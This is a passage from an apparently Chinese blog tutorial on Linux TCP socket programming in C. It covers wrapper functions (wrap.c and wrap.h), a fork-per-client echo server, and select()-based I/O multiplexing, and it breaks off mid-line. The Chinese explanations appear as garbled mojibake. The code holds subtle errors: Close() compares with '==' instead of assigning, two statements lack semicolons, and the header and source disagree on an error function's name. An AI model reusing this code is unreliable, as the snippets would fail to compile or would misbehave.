*sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen);</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = read(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = write(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">if</span>((n == close(fd)) == <span class="number">-1</span>)</span><br><span class="line">perr_exit(<span class="string">"close error"</span>);</span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> Readn(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nread;</span><br><span class="line"><span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nread = read(fd,ptr,nleft)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line">nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">nleft-= nread;</span><br><span class="line">ptr += nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n-nleft;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nwritten;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nwritten = write(fd,ptr,nleft)) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(nwritten &lt; <span class="number">0</span> &amp;&amp; errno == EINTR)</span><br><span class="line">nwritten = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">nleft -= nwritten;</span><br><span class="line">ptr += nwritten;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°è‡ªå®šä¹‰å¤´æ–‡ä»¶<code>wrap.h</code>ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Readn</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>å®ç°æœåŠ¡ç«¯<code>server.c</code>ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">catch_child</span><span class="params">(<span class="keyword">int</span> signum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(waitpid(<span class="number">0</span>,<span class="literal">NULL</span>,WNOHANG) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd,cfd;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> ret,i;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">lfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(lfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">cfd = Accept(lfd,(struct sockaddr *)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"fork error"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">close(lfd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct sigaction act;</span><br><span class="line">act.sa_handler = catch_child;</span><br><span class="line">sigemptyset(&amp;act.sa_mask);</span><br><span class="line">act.sa_flags = <span class="number">0</span>;</span><br><span class="line">ret = sigaction(SIGCHLD,&amp;act,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"sigaction error"</span>);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">ret = Read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è”åˆç¼–è¯‘ç”Ÿæˆ<code>server</code>æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc server.c wrap.c -o server</span><br></pre></td></tr></table></figure><h4 id="å¤šè·¯IOè½¬æ¥"><a href="#å¤šè·¯IOè½¬æ¥" class="headerlink" title="å¤šè·¯IOè½¬æ¥"></a>å¤šè·¯IOè½¬æ¥</h4><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>å€ŸåŠ©å†…æ ¸ï¼Œselectæ¥ç›‘å¬å®¢æˆ·ç«¯è¿æ¥ã€æ•°æ®é€šä¿¡äº‹ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> nfds, fd_set *readfds, fd_set *writefds,</span></span></span><br><span class="line"><span class="function"><span class="params">         fd_set *exceptfds, struct timeval *timeout)</span></span>;</span><br><span class="line"></span><br><span class="line">nfds:ç›‘å¬çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦ä¸­ï¼Œæœ€å¤§æ–‡ä»¶æ–‡ä»¶æè¿°ç¬¦+<span class="number">1</span></span><br><span class="line">readfds:è¯»æ–‡ä»¶æè¿°ç¬¦ç›‘å¬é›†åˆ</span><br><span class="line">writefds:å†™æ–‡ä»¶æè¿°ç¬¦ç›‘å¬é›†åˆ</span><br><span class="line">exceptfds:å¼‚å¸¸æ–‡ä»¶æè¿°ç¬¦ç›‘å¬é›†åˆ</span><br><span class="line">timeout:</span><br><span class="line">&gt;<span class="number">0</span> : è®¾ç½®ç›‘å¬è¶…æ—¶æ—¶é•¿</span><br><span class="line">  <span class="literal">NULL</span> : é˜»å¡ç›‘å¬</span><br><span class="line">  <span class="number">0</span> : éé˜»å¡ç›‘å¬ï¼Œè½®è¯¢</span><br><span class="line"></span><br><span class="line">è¿”å›å€¼</span><br><span class="line">    &gt;<span class="number">0</span> : æ‰€æœ‰ç›‘å¬é›†åˆä¸­ï¼Œæ»¡è¶³å¯¹åº”äº‹ä»¶çš„æ€»æ•°</span><br><span class="line">    <span class="number">0</span> : æ²¡æœ‰æ»¡è¶³ç›‘å¬æ¡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *<span class="built_in">set</span>)</span> <span class="comment">//æ¸…ç©ºä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦é›†åˆ</span></span></span><br><span class="line"><span class="function">  fd_set rset</span>;</span><br><span class="line">FD_ZERO(&amp;rset);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//å°†å¾…ç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ·»åŠ åˆ°ç›‘å¬é›†åˆä¸­</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_SET</span><span class="params">(<span class="number">3</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">5</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">6</span>,&amp;rset)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span>  <span class="comment">//å°†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä»ç›‘å¬é›†åˆä¸­ç§»é™¤</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_CLR</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//åˆ¤æ–­ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯å¦åœ¨ç›‘å¬é›†åˆä¸­</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_ISSET</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨selectå®ç°å¤šè·¯IOè½¬æ¥"><a href="#ä½¿ç”¨selectå®ç°å¤šè·¯IOè½¬æ¥" class="headerlink" title="ä½¿ç”¨selectå®ç°å¤šè·¯IOè½¬æ¥"></a>ä½¿ç”¨selectå®ç°å¤šè·¯IOè½¬æ¥</h5><p><code>server</code>ç«¯ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> listenfd,connfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">listenfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(listenfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(listenfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">fd_set rset,allset; <span class="comment">//å®šä¹‰ è¯»é›†åˆï¼Œå¤‡ä»½é›†åˆallset</span></span><br><span class="line">FD_ZERO(&amp;allset);  <span class="comment">//æ¸…ç©ºç›‘å¬é›†åˆ</span></span><br><span class="line">FD_SET(listenfd,&amp;allset); <span class="comment">//å°†å¾…ç›‘å¬fdæ·»åŠ åˆ°ç›‘å¬é›†åˆä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret,maxfd = <span class="number">0</span>,i,n,j;</span><br><span class="line">maxfd = listenfd; <span class="comment">//æœ€å¤§æ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">rset = allset;  <span class="comment">//å¤‡ä»½</span></span><br><span class="line">ret = select(maxfd+<span class="number">1</span>,&amp;rset,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>); <span class="comment">//ä½¿ç”¨selectç›‘å¬</span></span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"select error"</span>);</span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(listenfd,&amp;rset))&#123; <span class="comment">//listenfdæ»¡è¶³ç›‘å¬çš„è¯»äº‹ä»¶</span></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line">connfd = Accept(listenfd,(struct sockaddr*)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">FD_SET(connfd,&amp;allset); <span class="comment">//å°†æ–°äº§ç”Ÿçš„fdæ·»åŠ åˆ°ç›‘å¬é›†åˆä¸­ï¼Œç›‘å¬æ•°æ®è¯»äº‹ä»¶</span></span><br><span class="line"><span class="keyword">if</span>(maxfd &lt; connfd) <span class="comment">//ä¿®æ”¹maxfd</span></span><br><span class="line">maxfd = connfd;</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">1</span>) <span class="comment">//è¯´æ˜selectåªè¿”å›ä¸€ä¸ªï¼Œå¹¶ä¸”æ˜¯listenfdï¼Œåç»­æŒ‡ä»¤æ— éœ€æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=listenfd+<span class="number">1</span>;i&lt;=maxfd;i++)&#123; <span class="comment">//å¤„ç†æ»¡è¶³è¯»äº‹ä»¶çš„fd</span></span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(i,&amp;rset))&#123; <span class="comment">//æ‰¾åˆ°æ»¡è¶³è¯»äº‹ä»¶çš„é‚£ä¸ªfd</span></span><br><span class="line">n = read(i,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)&#123; <span class="comment">//æ£€æµ‹åˆ°å®¢æˆ·ç«¯å·²ç»å…³é—­è¿æ¥</span></span><br><span class="line">Close(i);</span><br><span class="line">FD_CLR(i,&amp;allset); <span class="comment">//å°†å…³é—­çš„fdç§»é™¤å‡ºç›‘å¬é›†åˆ</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"read error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span 